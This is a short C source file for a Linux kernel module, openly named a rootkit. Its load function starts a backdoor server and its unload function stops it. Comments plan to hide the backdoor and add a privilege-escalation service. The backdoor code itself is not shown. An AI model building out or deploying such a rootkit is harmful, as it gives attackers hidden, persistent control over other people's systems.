#include "rootkit.h"
#include "backdoor.h"

static int __init rkit_init(void)
{
  // Start backdoor server
  printk(KERN_INFO "Loaded rootkit\n");
  if(backdoor_start() != 0) {
#ifdef DEBUG
    printk(KERN_DEBUG "Unable to start backdoor\n");
#endif
  }
  // TODO: Hide backdoor server
  // TODO: Enable privesc service
  return 0;
}

static void __exit rkit_exit(void)
{
  // Stop backdoor server
  if (backdoor_stop() != 0) {
#ifdef DEBUG
    printk(KERN_INFO "Unable to stop backdoor\n");
#endif
  }
  printk(KERN_INFO "Shutdown successful\n");
}

module_init(rkit_init);
module_exit(rkit_exit);
